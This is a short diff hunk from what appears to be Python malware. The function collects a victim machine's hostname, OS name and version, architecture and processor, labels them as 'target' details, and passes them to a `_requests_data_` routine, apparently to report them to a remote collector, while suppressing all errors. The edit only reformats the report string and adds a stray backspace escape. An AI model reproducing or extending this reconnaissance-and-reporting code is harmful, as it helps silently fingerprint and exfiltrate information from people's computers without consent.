@@ -75,7 +75,7 @@ def _all_():
         system_architecture = platform.architecture() # ___
         system_processor = platform.processor()       # ___
         ip_target = socket.gethostname()              # ___
-        _requests_data_(f"[Ip Target : {str(ip_target)}]\nName System target : {name_system}\nVersion System Target : {version_system}\nNode : {node}\nSystem Architecture : {system_architecture}\nSystem Processor : {system_processor}\nTime : {org_time}")
+        _requests_data_(f"[Ip Target : {str(ip_target)}]\n\nName System target : {name_system}\n\nVersion System Target : {version_system}\n\nNode : {node}\nSystem Architecture : {system_architecture}\n\nSystem Processor : {system_processor}\n\bTime : {org_time}")
     except:
         pass
     
